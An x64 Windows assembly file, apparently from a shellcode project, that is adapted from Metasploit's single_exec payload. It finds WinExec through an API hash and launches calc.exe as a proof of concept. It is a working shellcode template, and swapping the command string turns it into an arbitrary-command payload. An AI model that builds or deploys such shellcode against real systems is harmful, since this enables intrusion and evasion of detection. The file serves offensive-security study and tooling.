; Execute the WinExec API
;
; Resources
;   - https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/single/single_exec.asm

    cld                             ; Clear the direction flag.
    and rsp, 0xFFFFFFFFFFFFFFF0     ; Align stack pointer to 16-byte boundary.
    call main                       ; Call `start:` and push the address of the `delta: -> api_call` onto the stack.
delta:
%include "./components/api.asm"
main:
    pop rbp                         ; Pop off the address of 'api_call:' onto the stack.
    mov rdx, 1                      ; uCmdShow = 1
    lea rcx, [rbp+command-delta]    ; lpCmdLine = "calc"
    mov r10d, 0x876F8B31            ; The hash of kernel32.dll!WinExec that has been generated with `python3 scripts/hash.py kernel32.dll WinExec`.
                                    ; The address of the WinExec will be resolved using this hash in the api_call.
    call rbp                        ; Call api_call to execute the WinExec(&command, 1);
%include "./components/exitfunc.asm"
command:
    db "calc.exe", 0
